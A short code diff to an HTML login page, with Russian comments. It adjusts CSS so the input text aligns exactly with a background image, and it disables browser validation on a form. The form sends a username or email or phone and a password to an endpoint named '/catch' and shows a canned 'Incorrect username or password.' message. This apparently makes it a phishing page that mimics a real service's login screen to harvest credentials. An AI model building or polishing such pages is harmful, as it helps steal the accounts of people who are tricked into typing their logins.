@@ -50,12 +50,12 @@
             color: #ffffff;
             font-size: 14px;
             
-            /* Отступ слева 22px двигает курсор ровно к началу текста на картинке */
-            padding: 0 10px 0 22px;
+            /* Подвинули текст ниже и левее/правее для точного совпадения */
+            padding: 10px 10px 0 16px;
             
             box-sizing: border-box;
             box-shadow: none !important;
-            line-height: 38px;
+            line-height: normal;
         }
 
         .input-control:focus {
@@ -105,7 +105,8 @@
 <body>
 
     <div class="auth-container">
-        <form action="/catch" method="POST">
+        <!-- novalidate отключает стандартные всплывающие ошибки браузера -->
+        <form action="/catch" method="POST" novalidate>
             <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required autocomplete="off">
             <input type="password" name="password" class="input-control" placeholder="Password" required autocomplete="off">
             <div class="error-message">Incorrect username or password.</div>
